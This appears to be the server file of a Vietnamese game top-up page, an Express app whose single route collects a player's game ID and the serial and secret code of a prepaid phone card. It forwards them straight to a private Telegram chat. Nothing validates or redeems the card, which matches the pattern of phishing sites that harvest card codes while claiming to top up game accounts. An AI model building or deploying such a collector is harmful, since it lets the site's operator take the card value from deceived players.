// server.js
const express = require("express");
const path = require("path");
const fetch = (...args) => import('node-fetch').then(({default: f}) => f(...args));

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static client files
app.use(express.static(path.join(__dirname, "public")));

// API an toàn: client gọi API này, server sẽ gửi message lên Telegram
app.post("/api/send-card", async (req, res) => {
  try {
    const { game_id, server, telco, amount, serial, code } = req.body;

    if (!game_id || !server || !telco || !amount || !serial || !code) {
      return res.status(400).json({ ok: false, message: "Thiếu thông tin" });
    }

    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(500).json({ ok: false, message: "Server chưa cấu hình Telegram" });
    }

    const time = new Date().toLocaleString("vi-VN");
    const text = `🧾 YÊU CẦU NẠP THẺ\n🕒 Thời gian: ${time}\n🎮 ID Game: ${game_id}\n🌐 Server: ${server}\n📡 Nhà mạng: ${telco}\n💰 Mệnh giá: ${amount}đ\n🔢 Seri: ${serial}\n🔐 Mã thẻ: ${code}`;

    const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
    });
    const data = await resp.json();

    if (!data.ok) {
      return res.status(500).json({ ok: false, tg: data });
    }

    return res.json({ ok: true });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ ok: false, message: "Lỗi server" });
  }
});

// All other routes -> serve index.html (SPA style)
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server listening on ${PORT}`));